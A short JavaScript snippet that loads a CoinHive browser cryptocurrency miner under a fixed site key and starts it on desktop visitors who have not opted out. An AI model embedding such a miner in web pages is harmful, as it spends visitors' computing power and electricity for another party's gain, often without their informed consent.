var miner = new CoinHive.Anonymous('MICu53i7GkQUO0BWykFGwPR8W4GPPBjs');
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}